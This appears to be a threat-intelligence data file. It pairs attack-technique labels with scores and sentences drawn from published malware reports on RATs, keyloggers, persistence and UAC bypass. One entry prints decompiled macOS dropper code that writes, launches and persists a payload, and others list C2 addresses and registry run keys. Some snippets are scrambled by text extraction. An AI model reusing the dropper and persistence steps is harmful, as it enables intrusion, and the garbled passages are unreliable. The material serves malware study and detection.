Adds Run Registry Key for Persistence|0.8235415816299652|['These RAT executables are obfuscated using Crypto Obfuscator For .Net.', 'msword.exe then starts the process igfx.exe which performs the following actions: Checks the .NET version in the registry; based on the installed version, renames the compatible RAT file to excel.exe Checks the registry keys to determine the .NET version in the order listed below.', 'If found, a version of the runtime file (AsyncRAT) is picked corresponding to the .NET version.', 'If none of the registry keys are found, the file 3_5 (LimeRAT) is used.', 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5.1 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5.2 6/10HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.6 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.6.1 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.7 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.7.2 Sets the file attributes of excel.exe to hidden and read-only.', 'Adds a Run registry entry for persistence.', 'Deletes the unused RAT executable files.', 'Starts the excel.exe process.', 'Figure 11.', 'Process chain Figure 12.', 'Run registry entries Both AsyncRAT and LimeRAT source code are publicly available.']
added to the startup folder|0.8003899913657521|"['.pphhpp?', '?jjdd==11029,3321194 .', '0 G9PD.D22F0022200020 09100399:2G50A6KB,L31K1,A.h.dtZotIcpP s 2:29/9./.0y09a9.n.2d20e02x20.0 r 1u16/7:s:5e00a4:r:3c05h1/?text=%20General%20Dynamics%20UK%20Ltd%20&lr=16 https://mail.clicktocareers[.', ']com/public/jobapplications/jdviewer.php?jd=77234 PDF20200920KLKA.PDF 29.09.2020 17:06:11 https://generaldynamics.uk.com/systems/,See what we do - General Dynamics UK,29.09.2020 14:11 https://mail.yandex.ru/?uid=*********#message/***************, Rob sent you a new message Rob Wilson LinkedIn .,29.09.2020 14:21 2 of 6 4/28/2021, 2:42 AMLazarus Group Recruitment: Threat Hunters vs Head Hunters https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat... https://mail.yandex.ru/?uid=*********#message/***************, Job Proposal at GDLS Rob Wilson .,29.09.2020 16:50 https://mail.yandex.ru/?uid=*********#message/***************, Re: Job Proposal at GDLS Rob Wilson .,29.09.2020 17:03 Sensitive information has been replaced with asterisks (*).', 'Oannd t ihne rceosmpopnrsoem riesceedi vceosm ap puateyrl,o tahde (astetea ctkheer Ts rpoejrafno-rDmoewd nrleocaodnenra Aisgsaanmceem unsionng s seycsttieomn) .c Comommmanadnsd qeuxeercyu.etixoen, qanudse nr.eetxweo, rakn dre ncoetnsntaati.sesxaen caen do nin tshtea lcleodm ap Cutoemr wmesrCe accahrerire bda ocuktd uosoirn nga tmhee dp uCbolimc mutsiClitayc hSeMr.dBaMt, AwPh idcehs giganinesd pfoerrs sicstaennncien gv iSaM anB L sNerKvi cfielse.', 'in the startup folder.', ""The experts also discovered the evidence of launching the malicious DLL Trojan-Downloader Agamemnon regid.mdb (compilation date: 2020-09-14T16:21:26Z), which is extracted from a malicious document, then collects information from the infected host, sends it to the attackers' server, 2."", 'Malicious document The phishing document GD2020090939393903.doc contains a decoy text in the form of a job offer.', 'The text of the document: Senior Business Manager JECCTAomllenbpeeln laaeuLorrcaoyaaolcmnnm aeccmStneeuait tlo LLianTeenr:yvvgy pee :WellO a: p$s MMt7hFuui2iussoknlttn gl s-t CB: oTue $nir S1,mrAo2 eebm0D nlekC te l Tyte olP eoOcsbostmeamsiusnt::i nNNgoo nnAeellowed Job Description: GWGYeiiontvuehe r nwaa il tl ghlDle yo anbnlaaasmltoi u ctreseen a jMmooi fyso sfoai u o1rfn3 l ,weS0oxy0ris0kbt+ le aemtn sodw p o( wrGphkDro Mo eSfwn)eev s iesarnirogoenin,mna eelwnesetr, s vw wahaele urdpeeia vrtcetrornunsestertr ,ipw boihurtotthnif eootsnlhtsiey o ,a b roeaefsl tirh geiincgnmoh eg inntntied zcuaehsndntd or alytno rdgta yonr sesepwoxaalprruaedtnneidcdo y.nt.', 'sh I,eWf e pb wroohoufodnf udewcsret soha fira genih dnla nynso devc raowvtmhiipacoetent s iw itetni h vdateoth ebre eendnsaeeobffnleiaentt ssece su a sanwtndiod tm phesr rciysido eeutn ,oto iuwsfreuis cceic lneavvsreisestfn euai lsnyl.', 'oy bu e e itx noe g c ju aot ie gn r m eoi aus trs i pho lin ags ch e a pc ter oro fs wos or rma kal nl wc ied t o htm ea aai mn s!s h ao rf e do p se er na st ei o on f. purpose.']"
Screen capture|0.7874139748068278|"['For example, MicRecord runs in the context of the malware itself and not as an external plugin.', 'The recording is performed using the mciSendStringA API and the following command lines: Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 Below is the full list of supported Stealth Soldier commands: Implant Command Arguments Description Implant possible error possible error Error occured in getting Folder Directory Sends all directory Directory List of is: + Contents + DirectoryList name content filenames Managed to Count %d Files Before Error Uploads the file to the File content + File File Failed to UploadFile filename C&C Uploaded Successfully be uploaded ScreenShot Taken Error Occured Successfully + Image to Runs sc.exe and sends in Creating Screenshot be uploaded = 1.png + to C&C ScreenShot ScreenShot Taken & Process Uploaded Successfully C:\\\\Users\\\\Public\\\\1.wav + Records the victims Failed to content + Recording MicRecord sleep time computer and sends it to Upload Saved & Uploaded C&C Recording File Successfully Error Occured Runs plugin kl.exe KeyLogger Task Started in Creating Keylogger (downloads it from C&C) Successfully KeyLogger Process 4/11Implant Command Arguments Description Implant possible error possible error Error Occured Runs BrCr.exe module BrowserCreds Task in Creating BrowserCreds (downloads it from C&C) Started Successfully BrowserCreds Process Command : : Runs PowerShell CommandExecutionResultExecuted but command with for Command: is: Failed to PowerPlus module CmdExec command +Command : : Executed Upload Result (pwls.dll).', 'The result of and Result Sent or Command : the command will be in Successfully : Failed to be C:\\\\Users\\\\Public\\\\Exec.', 'Executed Plugins The payload runs several plugins: first it downloads them, then writes to their respective filenames, and finally executes.', 'At the time of our analysis, some of the modules were no longer available for download.', 'Screen Capture The screen capture plugin is called sc.exe and is downloaded from the C&C server.', 'It is a compiled .NET open- source project named https://github.com/bencevans/screenshot-desktop.', 'The module supports the following arguments (can be seen using the flag /h or /help) Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter <filename> captures the screen or the active window and saves it to a file.', 'Usage: filename [WindowTitle] filename - the file where the screen capture will be saved allowed file extensions are - Bmp,Emf,Exif,Gif,Icon,Jpeg,Png,Tiff,Wmf.', 'WindowTitle - instead of capture whole screen you can point to a window with a title which will put on focus and captuted.', 'For WindowTitle you can pass only the first few characters.']"
Screen capture|0.7662544960977556|"['Access Command and T1032 Standard Cryptographic Protocol The RAT uses SSL for encrypting C2 communications.', 'Control T1043 Commonly Used Port The RAT uses port 443. https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 6/75/15/2020 Mikroceen: Spying backdoor leveraged in high-profile networks in Central Asia | WeLiveSecurity Tactic ID Name Description T1071 Standard Application Layer The RAT uses the Schannel implementation of SSL.', 'Protocol T1001 Data Obfuscation The RATs interface controls the client with obfuscated commands.', 'T1030 Proxy Connection The RAT has a proxy option that masks traffic between the malware and the remote operators.', 'Exfiltration T1041 Exfiltration Over Command and The operator of the RAT can download any desired file from a victim.', 'Control Channel Collection T1113 Screen Capture The RAT can capture the victims screen.', 'Peter Klnai 14 May 2020 - 02:00PM https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 7/7']"
Screen capture|1.0|"[""TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT."", 'TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger\'\' detailing TigerRAT and its downloader ""TigerDownloader.""', 'This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""']"
Keylogger|0.7541122277971726|[]
Keylogger|0.7901584262715234|[]
Keylogger|0.8265048709580344|[]
Keylogger|0.8631785412921766|['The MSVS project SVCHOST compiles/creates the SVCHOST.DLL binary.', 'The RESSDT.SYS binary is placed in its resource section.', '3.', 'The MSVS project INSTALL compiles/creates the INSTALL.EXE binary.', 'The SVCHOST.DLL binary is placed in its resource section.', '4.', 'The MSVS project GH0ST compiles/creates the GH0ST.EXE binary.', 'The INSTALL.EXE binary is placed in its resource section.', '5.', 'The GH0ST.EXE application is used to configure a custom Gh0st server binary (See Gh0st RAT Operation section).', 'When the Generate button on the Build tab is clicked, the INSTALL.EXE binary is extracted from its own resource section and saved to disk (default name is SERVER.EXE).']
Keylogger|0.7758967193998954|['0xA4 NOP S Does nothing.', 'Possibly an unimplemented or deleted function.', '0xA5 Delete registry key S Deletes a registry key.', 'Can be a subkey.', 'Packet contains: [4] - Registry key name length [var] - Registry key name Returns success or failure with parameters 6/6.', '0xB6 Keylogger response C Sends keylogger data from the keylogger buffer file.', 'Keylogger data: [4] - Length [1] - All bytes read?', '1 or 0 [var] - Keylogger data Parameters are set to the output of function 4 in the class C vtable?', '0xB8 Keylogger data request S Requests keylogger data in a 0xB6 packet.CITIZEN LAB TECHNICAL BRIEF: IEXPL0RE RAT 30 0xC8 Unknown - get a screen- S Looks suspiciously like taking a screenshot.', 'shot?', 'Packet contains: [2] - Unknown [2] - Unknown [1] - Unknown Replies with failure or success with parameters 8/8.']
Keylogger|1.0|['This version consists of multiple RAT capabilities, additional plugins and a variety of detection-evasion techniques.', 'In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector.', 'https://blog.talosintelligence.com/2020/11/crat-and-plugins.html 1/3211/13/2020 Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: CRAT wants to plunder your endpoints Indicators and tactics, techniques and procedures (TTPs) discovered by this investigation resemble those of the Lazarus Group.', 'How did it work?', 'The attack consists of a highly modular malware that can function as a standalone RAT and download and activate additional malicious plugins from its C2 servers.', 'Cisco Talos has discovered multiple plugins so far, consisting of ransomware, screen-capture, clipboard monitoring and keylogger components.', 'So what?', 'This attack demonstrates how the adversary operates an attack that: Uses obfuscation and extensive evasion techniques to hide its malicious indicators.', 'Has evolved across versions to achieve effectiveness of their attack.', 'Employs a highly modular plugin framework to selectively infect targeted endpoints.', 'Most importantly, it deploys RAT malware to ransack the endpoint, followed by deployment of ransomware to either extort money or burn infrastructure of targeted entities.']
Keylogger|0.8997042809306331|['The Mac version shares multiple similarities with those designed for other operating systems.', 'However, the Mac agent brings more spying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes, calendar and Safari data.', 'B.', 'Attack Flow Last year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the Komplex name.', 'The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.', '1.', 'The Komplex Binder: Is the main executable of roskosmos_2015-2025.app.', 'Its main purpose is to save a second payload(the dropper) on the system and open the decoy pdf file pictured below.', 'v7 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(%@/roskosmos_2015-2025.pdf), v6); v8 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(SetFile -a E %@/ roskosmos_2015-2025.pdf), v6); v9 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(rm -rf %@/roskosmos_2015-2025.', 'app), v6); v10 = objc_msgSend( &OBJC_CLASS___NSString, stringWithFormat:, CFSTR(open -a Preview.app %@/roskosmos_2015-2025.pdf), v6); v11 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &joiner, 135028LL); objc_msgSend(v11, writeToFile:atomically:, CFSTR(/tmp/content), 1LL); v12 = (const char *)objc_msgSend(v9, UTF8String); system(v12); system(chmod 755 /tmp/content); v13 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &pdf, 1584258LL); objc_msgSend(v13, writeToFile:atomically:, v7, 1LL); v14 = (const char *)objc_msgSend(v8, UTF8String); system(v14); v15 = objc_msgSend(&OBJC_CLASS___NSTask, alloc); v16 = objc_msgSend(v15, init); objc_msgSend(v16, setLaunchPath:, CFSTR(/tmp/content)); objc_msgSend(v16, launch); objc_msgSend(v16, waitUntilExit); v17 = (const char *)objc_msgSend(v10, UTF8String); system(v17); The Komplex Binder [4]White Paper Komplex: roskosmos_2015-2025.pdf 2.', 'The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the infected system system(mkdir -p /Users/Shared/.local/ &> /dev/null); system(mkdir -p ~/Library/LaunchAgents/ &> /dev/null); off_10001B4F0(v5, &off_10001B4F0, CFSTR(/Users/Shared/.local/kextd), 1LL); off_10001B4F0(v6, &off_10001B4F0, CFSTR(/Users/Shared/com.apple.updates.plist), 1LL); off_10001B4F0(v7, &off_10001B4F0, CFSTR(/Users/Shared/start.sh), 1LL); system(cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null); remove(/Users/Shared/com.apple.updates.plist); system(chmod 755 /Users/Shared/.local/kextd); system(chmod 755 /Users/Shared/start.sh); 3.']
Keylogger|1.0|['Amadey.', '3.3.', 'Latest Attack Cases.. 3.3.1.', 'AutoIt Amadey.. 3.3.2.', 'RftRATPost-infection.', '4.1.', 'Keylogger.', '4.2.', 'Infostealer.', '4.3.', 'Other TypesConclusion1.']
Gathering system information|1.0|['EPICENTER RAT Enumerate, launch and kill processes.', 'Epicenter is a commodity RAT used by SideCopy since Take screenshots.', '2018.', 'It contains a variety of capabilities (Figure 21) Enumerate directories, delete files and folders.', 'including: Check persistence status for self.', 'Gathering system information.', 'Gather installed Antivirus product names.', 'PLUGIN ANALYSIS Shutdown, reboot system or log the user off.', 'Block keyboard and mouse inputs to self.', 'FILES MANAGER Uninstall self.', 'The files manager plugin used can scan all drives on the system recursively and record file paths to a log file named 2021 Cisco.']
Gathering system information|0.7628123347881908|"['WinMain function snippet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an array that will be returned to the caller function.', 'https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html 11/205/19/22, 12:15 PM Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Bitter APT adds Bangladesh to their targets Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus processes in the victim's machine by creating the snapshot of running processes using CreateToolhelp32Snapshot and iterates through each process using API Process32First and Process32Next."", 'https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html 12/205/19/22, 12:15 PM Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Bitter APT adds Bangladesh to their targets WinMain() snippet showing antivirus process detection.', ""The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory buffer."", 'Information-gathering function.', 'https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html 13/205/19/22, 12:15 PM Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Bitter APT adds Bangladesh to their targets The C2 communicating function at offset 401C50 is called from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avbb2.php?txt="" and ""data1.php?id="" to C2 and receive the response.', 'The received response is a remote file saved into the ""debug"" folder and executed with the API ""ShellExecuteA"".', 'In our research debugging environment, the remote file is similar to the trojan.', 'https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html 14/205/19/22, 12:15 PM Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Bitter APT adds Bangladesh to their targets Requests making function 1 at offset 00401E00.']"
Gathering system information|0.7628123347881908|"['WinMain function snippet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an array that will be returned to the caller function.', '11/19Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus processes in the victim's machine by creating the snapshot of running processes using CreateToolhelp32Snapshot and iterates through each process using API Process32First and Process32Next."", 'WinMain() snippet showing antivirus process detection.', ""12/19The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory buffer."", 'Information-gathering function.', 'The C2 communicating function at offset 401C50 is called from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avbb2.php?txt="" and ""data1.php?', 'id="" to C2 and receive the response.', 'The received response is a remote file saved into the ""debug"" folder and executed with the API ""ShellExecuteA"".', 'In our research debugging environment, the remote file is similar to the trojan.']"
System Information|1.0|"['impactful users, based on the level of risk to the frequently trigger investigations by security security violation or a potential security violation.', 'organization if they become compromised.', 'operations/analysts.', 'authorization attack surface A process of determining whether a subject is botnet analyst An information systems characteristics that permit allowed to have the specified types of access to a A collection of computers compromised by Also known as cybersecurity analyst, a common role an adversary to probe, attack, or maintain presence particular resource.', 'This action is typically done by malicious code and controlled across a network.', 'within an organizations SOC team that investigates, in the information system.', 'evaluating applicable access control information alerts, or hunts for adversary activities.', 'such as access control lists.', 'In modern cybersecurity approaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat intelligence.', 'Microsoft Digital Defense Report | September 2020 83TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSSARY breach ciphertext data estate encryption Any incident that results in unauthorized access of Data or information in its encrypted form used The procedures, services, and infrastructure used to The process of transforming plaintext into data, applications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes referred manage corporate data in the digital estate.']"
Decoding Function|0.7913560034762583|[': 0228-99-792-2600 oder cyberabwehr@bfv.bund.de Bundesamt fr Verfassungsschutz - Cyber-Brief Nr.', '01/2022 8TTLLPP::WWHHIITTEE BfV Cyber-Brief Anhang A.', 'Indicators of Compromise (IOCs) Typ IOC Funktion IP 104.168.236.46 C2-Server IP 103.79.77.200 C2-Server IP 87.98.190.184 C2-Server Weitere mgliche Indikatoren fr eine Infektion Die folgenden Indikatoren knnten auch einen legitimen Ursprung haben, sollten aber dennoch ein- gehend geprft werden: Log-Datei mit Tastaturanschlgen (vom Datei %TEMP%\\\\<username>.key.log Keylogger aufgezeichnet) Datei %TEMP%\\\\<username>.clip.log Log-Datei mit Inhalt der Zwischenablage Named Pipe fr IPC zwischen Daemon Named Pipe \\\\\\\\.\\\\pipe\\\\testpipe Prozess und Worker Prozess Mutex die vom Programm erstellt wird Mutex 80A85553-1E05-4323-B4F9-43A4396A4507 um Mehrfachausfhrung zu verhindern Wird angelegt wenn Schadsoftware mit Admin-Rechten ausgefhrt wird Service windefenders Anzeigename Windows Defenders Beschreibung Windows Defenders Service Optional weitere Injection in msiexec Prozess msiexec.exe durch entsprechendes C2-Kommando ausgelst Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 User Agent String den die Malware User Agent (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 fr C2 (https) verwendet Pfad auf dem C2-Server an den Remote Pfad /api/v2/ajax POST-Requests bertragen werden HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\ Run Key als Persistenzmechanismus bei Aus- Registry CurrentVersion\\\\Run\\\\windefenders fhrung ohne Admin-Rechte %ProgramFiles%\\\\Common Files\\\\windefenders\\\\ %ProgramFiles%\\\\Common Files\\\\windefenders\\\\config.ini %ProgramFiles%\\\\Common Files\\\\windefenders\\\\msmpeng.exe %ProgramFiles%\\\\Common Files\\\\windefenders\\\\thumb.dat %ProgramFiles%\\\\Common Files\\\\windefenders\\\\vftrace.dll Dateien / Ablageorte und Komponenten der Malware Pfade %ProgramData%\\\\windefenders\\\\ %ProgramData%\\\\windefenders\\\\config.ini %ProgramData%\\\\windefenders\\\\msmpeng.exe %ProgramData%\\\\windefenders\\\\thumb.dat %ProgramData%\\\\windefenders\\\\vftrace.dll Bundesamt fr Verfassungsschutz - Cyber-Brief Nr.', '01/2022 9TTLLPP::WWHHIITTEE BfV Cyber-Brief Anhang B. Detektionsregeln -HYPERBRO (Yara) Detektionsregel I: Stage-Loader Anmerkung: Die nachfolgende Yara-Regel dient zur Identifikation des initialen Stage-Loaders aus der Datei vftra- ce.dll der HYPERBRO Malware und detektiert die entsprechende Dekodier-Funktion.', 'import pe rule vftrace_loader { meta: id = 4eEDO8F3p27FeY5YLIPjrA fingerprint = b14d0c555f2908a31fefdfa23876d48589cd04dec9e7338a96bc85b0bf58b458 version = 1.0 first_imported = 2022-01-14 last_modified = 2022-01-14 status = RELEASED sharing = TLP:WHITE source = BUNDESAMT FUER VERFASSUNGSSCHUTZ author = Bundesamt fuer Verfassungsschutz description = Yara rule to detect first Hyperbro Loader Stage, often called vftrace.dll.', 'Detects decoding function.', 'category = MALWARE malware = HYPERBRO mitre_att = S0398 reference = Warnmeldung des BFV - Aktuelle APT27-Angriffskampagne gegen deutsche Wirtschaftsunternehmen hash = 333B52C2CFAC56B86EE9D54AEF4F0FF4144528917BC1AA1FE1613EFC2318339A strings: $decoder_routine = { 8A ?', '?', '41 10 00 00 8B ?', '?', '28 ?']
decoding function|0.7913560034762583|[': 0228-99-792-2600 oder cyberabwehr@bfv.bund.de Bundesamt fr Verfassungsschutz - Cyber-Brief Nr.', '01/2022 8TTLLPP::WWHHIITTEE BfV Cyber-Brief Anhang A.', 'Indicators of Compromise (IOCs) Typ IOC Funktion IP 104.168.236.46 C2-Server IP 103.79.77.200 C2-Server IP 87.98.190.184 C2-Server Weitere mgliche Indikatoren fr eine Infektion Die folgenden Indikatoren knnten auch einen legitimen Ursprung haben, sollten aber dennoch ein- gehend geprft werden: Log-Datei mit Tastaturanschlgen (vom Datei %TEMP%\\\\<username>.key.log Keylogger aufgezeichnet) Datei %TEMP%\\\\<username>.clip.log Log-Datei mit Inhalt der Zwischenablage Named Pipe fr IPC zwischen Daemon Named Pipe \\\\\\\\.\\\\pipe\\\\testpipe Prozess und Worker Prozess Mutex die vom Programm erstellt wird Mutex 80A85553-1E05-4323-B4F9-43A4396A4507 um Mehrfachausfhrung zu verhindern Wird angelegt wenn Schadsoftware mit Admin-Rechten ausgefhrt wird Service windefenders Anzeigename Windows Defenders Beschreibung Windows Defenders Service Optional weitere Injection in msiexec Prozess msiexec.exe durch entsprechendes C2-Kommando ausgelst Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 User Agent String den die Malware User Agent (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 fr C2 (https) verwendet Pfad auf dem C2-Server an den Remote Pfad /api/v2/ajax POST-Requests bertragen werden HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\ Run Key als Persistenzmechanismus bei Aus- Registry CurrentVersion\\\\Run\\\\windefenders fhrung ohne Admin-Rechte %ProgramFiles%\\\\Common Files\\\\windefenders\\\\ %ProgramFiles%\\\\Common Files\\\\windefenders\\\\config.ini %ProgramFiles%\\\\Common Files\\\\windefenders\\\\msmpeng.exe %ProgramFiles%\\\\Common Files\\\\windefenders\\\\thumb.dat %ProgramFiles%\\\\Common Files\\\\windefenders\\\\vftrace.dll Dateien / Ablageorte und Komponenten der Malware Pfade %ProgramData%\\\\windefenders\\\\ %ProgramData%\\\\windefenders\\\\config.ini %ProgramData%\\\\windefenders\\\\msmpeng.exe %ProgramData%\\\\windefenders\\\\thumb.dat %ProgramData%\\\\windefenders\\\\vftrace.dll Bundesamt fr Verfassungsschutz - Cyber-Brief Nr.', '01/2022 9TTLLPP::WWHHIITTEE BfV Cyber-Brief Anhang B. Detektionsregeln -HYPERBRO (Yara) Detektionsregel I: Stage-Loader Anmerkung: Die nachfolgende Yara-Regel dient zur Identifikation des initialen Stage-Loaders aus der Datei vftra- ce.dll der HYPERBRO Malware und detektiert die entsprechende Dekodier-Funktion.', 'import pe rule vftrace_loader { meta: id = 4eEDO8F3p27FeY5YLIPjrA fingerprint = b14d0c555f2908a31fefdfa23876d48589cd04dec9e7338a96bc85b0bf58b458 version = 1.0 first_imported = 2022-01-14 last_modified = 2022-01-14 status = RELEASED sharing = TLP:WHITE source = BUNDESAMT FUER VERFASSUNGSSCHUTZ author = Bundesamt fuer Verfassungsschutz description = Yara rule to detect first Hyperbro Loader Stage, often called vftrace.dll.', 'Detects decoding function.', 'category = MALWARE malware = HYPERBRO mitre_att = S0398 reference = Warnmeldung des BFV - Aktuelle APT27-Angriffskampagne gegen deutsche Wirtschaftsunternehmen hash = 333B52C2CFAC56B86EE9D54AEF4F0FF4144528917BC1AA1FE1613EFC2318339A strings: $decoder_routine = { 8A ?', '?', '41 10 00 00 8B ?', '?', '28 ?']
Log keystrokes|0.9387455016724598|['properly restricted and assigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconnaissance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand access.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/application: Windows OS workstations, execution Windows domain controllers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/application: Discovered systems, including networked uninterruptable power Role in infrastructure: These systems support supply (UPS) devices, data center servers, business operations, manage permissions and a telephone communications server, and domain access, and provide remote network employee workstations access respectively.', 'Role in infrastructure: Internal reconnaissance Exploitation method: Threat actors use delivered efforts could potentially include all deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to access combination of valid user credentials and the domain controller, recover additional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged accounts.', 'network discovery.', 'VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote connections to workstations and servers.', 'enabling them to expand access across the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent access, and blend into regular systems deployed across the network, identify network traffic.', 'targets, and begin preparations for final attack.']
Bypass UAC|0.7758481824716823|"[',  (Kill Switch)      .', ',    (Kill Switch) .', '01.', '(Fileless)      .', '(1) (FILELESS)     v2.1, v2.1( ver- sion=3.0.0), v3.0  .', '.', 'ASEC REPORT Vol.91 | Security Trend 41-1) v2.1 4 ,     v2.1  .', '(Magnitude)   ,  [ 1-1] .', '1-1 | v2.1     ,   mshta.exe, rundll32.', 'exe, WMIC.exe  URL .', '.']"
Bypass UAC|0.7887880352241177|['Noob is a word describing that someone is new to a game, concept, or idea; implying a lack of experience.', 'But now lets have a look at what the botnet really is.', 'Marketing vs.', 'Reality After having a glimpse at the ad designed to promote the malware, we analyzed a sample of it: 3917107778F928A6F65DB34553D5082A, which is detected as Gen:Variant.Zusy.118945.', 'We decided to analyze some features mentioned in the flyer and on the other website to evaluate their power and implementation.', 'Feature: Bypass UAC As expected, the malware does not really bypass the UAC.', 'It rather uses a classic trick already used by several malware instances.', 'It uses a legitimate Microsoft binary in order to execute itself with administrator permissions.', 'We already presented this technique in our G DATA SecurityBlog article about the Beta Bot.', 'Feature: Anti-VM The flyer explains that the botnet wont work in a virtual machine.', 'To detect whether the malware is running in a virtual machine, the malware author checks if the following directories and the one file exist: C:\\\\Program Files\\\\VMWare\\\\VMware Tools\\\\ C:\\\\Program Files (x86)\\\\VMware\\\\WMware Tools\\\\ C:\\\\WINDOWS\\\\system32\\\\VBoxtray.exe Furthermore, the malware checks if following applications analysts usually use are being executed: Wireshark: a network analyzer Fiddler: a web proxy used to debug HTTP flow.']
